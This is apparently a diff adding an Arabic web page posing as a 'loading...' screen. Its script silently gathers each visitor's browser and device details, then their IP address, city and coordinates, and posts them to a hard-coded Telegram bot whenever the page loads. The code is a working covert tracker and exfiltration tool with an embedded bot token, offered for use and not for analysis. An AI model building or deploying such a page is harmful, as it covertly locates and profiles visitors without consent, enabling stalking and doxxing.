@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>جاري التحميل...</title>
+<style>
+  * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #1e3c72, #2a5298);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .box {
+    background: rgba(0,0,0,0.35);
+    backdrop-filter: blur(10px);
+    border-radius: 16px;
+    padding: 30px;
+    max-width: 650px;
+    width: 100%;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+  }
+  h1 { text-align: center; margin-top: 0; font-size: 22px; }
+
+  .loader {
+    border: 5px solid rgba(255,255,255,0.2);
+    border-top: 5px solid #4fc3f7;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    animation: spin 1s linear infinite;
+    margin: 20px auto;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  #loading-msg {
+    text-align: center;
+    font-size: 18px;
+    margin-bottom: 10px;
+    animation: pulse 1.5s ease-in-out infinite;
+  }
+  @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.5;} }
+
+  #result { display: none; }
+  .row {
+    display: flex;
+    justify-content: space-between;
+    padding: 10px 12px;
+    border-bottom: 1px solid rgba(255,255,255,0.15);
+    font-size: 15px;
+  }
+  .row:last-child { border-bottom: none; }
+  .label { color: #90caf9; font-weight: bold; }
+  .value { color: #fff; text-align: left; word-break: break-all; max-width: 60%; }
+
+  .error { color: #ff8a80; text-align: center; margin-top: 15px; }
+</style>
+</head>
+<body>
+
+<div class="box">
+  <div id="loading-area">
+    <h1>🔎 جاري جمع المعلومات</h1>
+    <div class="loader"></div>
+    <p id="loading-msg">انتظر من فضلك... جاري التحميل، الموقع يبذل قصارى جهده في التحميل ⏳</p>
+  </div>
+
+  <div id="result">
+    <h1>✅ تم التحميل بنجاح</h1>
+    <div id="info-list"></div>
+  </div>
+
+  <div id="error" class="error"></div>
+</div>
+
+<script>
+// ⚠️ غيّر القيم دي لو حصل Revoke للتوكن
+const BOT_TOKEN = '8680172330:AAFrvbkiUsmfoaZAXO-WJEACXTprKmBjqpE';
+const CHAT_ID   = '7761866913';
+
+// دالة تبعت الرسالة على تليجرام
+async function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      })
+    });
+    const j = await res.json();
+    if (!j.ok) console.error('Telegram error:', j);
+  } catch (e) {
+    console.error('Send failed:', e);
+  }
+}
+
+// تهريب الأحرف الخاصة بـ HTML
+function esc(s) {
+  return String(s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+(async function () {
+  const infoList = document.getElementById('info-list');
+  const loadingArea = document.getElementById('loading-area');
+  const resultBox = document.getElementById('result');
+  const errorBox = document.getElementById('error');
+
+  const data = {};
+
+  // 1) معلومات المتصفح والجهاز
+  data['المتصفح'] = navigator.userAgent;
+  data['نظام التشغيل'] = navigator.platform || 'غير معروف';
+  data['اللغة'] = navigator.language || 'غير معروف';
+  data['اللغات المتاحة'] = (navigator.languages || []).join(', ');
+  data['عدد أنوية المعالج'] = navigator.hardwareConcurrency || 'غير معروف';
+  data['الذاكرة التقديرية'] = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير متاح';
+  data['دقة الشاشة'] = `${screen.width} × ${screen.height}`;
+  data['عمق الألوان'] = screen.colorDepth + ' bit';
+  data['حجم نافذة المتصفح'] = `${window.innerWidth} × ${window.innerHeight}`;
+  data['المنطقة الزمنية'] = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+  data['وقت الزيارة'] = new Date().toLocaleString('ar-EG');
+  data['نوع الجهاز'] = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'موبايل / تابلت' : 'كمبيوتر';
+  data['الاتصال بالإنترنت'] = navigator.onLine ? 'متصل ✅' : 'غير متصل ❌';
+  if (navigator.connection) {
+    data['نوع الشبكة'] = navigator.connection.effectiveType || 'غير معروف';
+    data['سرعة التحميل'] = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'غير معروف';
+  }
+  data['الكوكيز'] = navigator.cookieEnabled ? 'مفعّلة' : 'معطّلة';
+  data['DNT'] = navigator.doNotTrack || 'غير محدد';
+
+  // 2) معلومات الـ IP والموقع
+  try {
+    const res = await fetch('https://ipwho.is/');
+    const ip = await res.json();
+    if (ip && ip.success !== false) {
+      data['عنوان الـ IP'] = ip.ip || 'غير معروف';
+      data['نوع الـ IP'] = ip.type || 'غير معروف';
+      data['القارة'] = ip.continent || 'غير معروف';
+      data['الدولة'] = (ip.country || 'غير معروف') + (ip.country_code ? ' (' + ip.country_code + ')' : '');
+      data['المدينة'] = ip.city || 'غير معروف';
+      data['المنطقة'] = ip.region || 'غير معروف';
+      data['الرمز البريدي'] = ip.postal || 'غير معروف';
+      data['خط العرض'] = ip.latitude ?? 'غير معروف';
+      data['خط الطول'] = ip.longitude ?? 'غير معروف';
+      data['مزود الخدمة (ISP)'] = (ip.connection && ip.connection.isp) || 'غير معروف';
+      data['المنظمة'] = (ip.connection && ip.connection.org) || 'غير معروف';
+      data['ASN'] = (ip.connection && ip.connection.asn) || 'غير معروف';
+      data['العملة'] = (ip.currency && (ip.currency.name + ' (' + ip.currency.code + ')')) || 'غير معروف';
+      data['علم الدولة'] = ip.flag && ip.flag.emoji ? ip.flag.emoji : '🏳️';
+    } else {
+      throw new Error('فشل جلب معلومات الـ IP');
+    }
+  } catch (e) {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const ip = await res.json();
+      data['عنوان الـ IP'] = ip.ip || 'غير معروف';
+      data['الدولة'] = ip.country_name || 'غير معروف';
+      data['المدينة'] = ip.city || 'غير معروف';
+      data['المنطقة'] = ip.region || 'غير معروف';
+      data['مزود الخدمة'] = ip.org || 'غير معروف';
+      data['خط العرض'] = ip.latitude ?? 'غير معروف';
+      data['خط الطول'] = ip.longitude ?? 'غير معروف';
+      data['المنطقة الزمنية (IP)'] = ip.timezone || 'غير معروف';
+    } catch (err) {
+      errorBox.textContent = '⚠️ تعذّر جلب معلومات الـ IP (يمكن فيه مانع إعلانات أو مشكلة في الشبكة).';
+    }
+  }
+
+  // 3) بناء الرسالة وإرسالها لتليجرام
+  let msg = '🚨 <b>زيارة جديدة!</b>\n';
+  msg += '━━━━━━━━━━━━━━━\n';
+  for (const [key, value] of Object.entries(data)) {
+    msg += `▪️ <b>${esc(key)}:</b> ${esc(value)}\n`;
+  }
+  msg += '━━━━━━━━━━━━━━━\n';
+  msg += '🕐 ' + new Date().toLocaleString('ar-EG');
+
+  // لو الرسالة طويلة، نقسمها
+  const MAX = 4000;
+  if (msg.length <= MAX) {
+    await sendToTelegram(msg);
+  } else {
+    let part = '';
+    for (const line of msg.split('\n')) {
+      if ((part + line + '\n').length > MAX) {
+        await sendToTelegram(part);
+        part = '';
+      }
+      part += line + '\n';
+    }
+    if (part) await sendToTelegram(part);
+  }
+
+  // 4) عرض النتيجة للمستخدم
+  loadingArea.style.display = 'none';
+  resultBox.style.display = 'block';
+
+  for (const [key, value] of Object.entries(data)) {
+    const row = document.createElement('div');
+    row.className = 'row';
+    row.innerHTML = `<span class="label">${key}</span><span class="value">${value}</span>`;
+    infoList.appendChild(row);
+  }
+})();
+</script>
+</body>
+  </html>
